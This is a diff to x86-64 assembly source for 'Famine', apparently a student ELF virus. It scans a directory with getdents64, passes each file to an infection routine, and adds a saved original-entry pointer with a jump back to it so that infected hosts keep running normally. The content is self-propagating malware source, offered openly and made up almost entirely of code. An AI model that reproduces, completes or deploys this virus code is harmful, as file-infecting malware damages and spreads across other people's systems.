@@ -14,6 +14,9 @@ section .text
 	extern _treat_file
 	extern _final_end
 
+_o_entry:
+	dq 0x0000000000000000 
+
 _string:
 	db 'Famine version 1.0 (c)oded by cdrouet-rludosan', 0
 
@@ -26,7 +29,7 @@ _start:
 	; rsp + 280: virus size
 	; rsp + 288: fd directory
 	; rsp + 296: pointer to current dir file
-	; rsp + 304: unused
+	; rsp + 304: buffer end address
 	; rsp + 312: unused
 
 _calculate_virus_size:
@@ -47,7 +50,7 @@ _open_dir:
 	syscall ; open
 	pop rdi ; we pushed, so we pop
 	cmp rax, -1 ; if open return something under or equal of -1, jump to end
-	jle _end
+	jle _end_famine
 	mov QWORD [rsp + 288], rax ; fd directory = return of open (fd)
 
 _file_loop:
@@ -57,13 +60,15 @@ _file_loop:
 	mov rax, 217 ; getdents64 syscall number
 	syscall
 	cmp rax, 0 ; we check if getdents64 read something, if not, we are at the end of dir or their is an error
-	jle _end
+	jle _end_famine
 	mov r10, rax ; mov to r10 the number of bytes readed
 	add r10, rsp ; set the maximum theoric address for the readed datas (start buffer address + number of bytes read)
+	mov QWORD [rsp + 304], r10
 	mov rsi, rsp ; initialize rsi with our buffer address on the stack
 	mov QWORD [rsp + 296], rsi
 
 _read_data:
+	mov r10, QWORD [rsp + 304]
 	cmp QWORD [rsp + 296], r10 ; r10 is the address of the end of the buffer, so we check if our address is too far in memory
 	jge _file_loop ; and we jump to read again the dir datas, to see if their is anothers datas to treat
 
@@ -90,6 +95,7 @@ _continue_print:
 	mov rax, 1 ; write syscall number
 	syscall
 	mov rdi, rsi
+	mov rsi, QWORD [rsp + 280]
 	call _treat_file
 ;	sub rsi, 19 ; decrease offset
 	mov rsi, [rsp + 296]
@@ -102,9 +108,15 @@ _continue:
 	mov QWORD [rsp + 296], rsi
 	jmp _read_data
 	
-_end:
+_end_famine:
+	lea r10, [rel _o_entry]
+	cmp QWORD [r10], 0
+	jne _jmp_to_o_entry
 	mov rax, 60 ; exit syscall number, will not be in final code
 	mov rdi, 0
 	syscall
 	leave
 	ret
+
+_jmp_to_o_entry:
+	jmp [_o_entry]
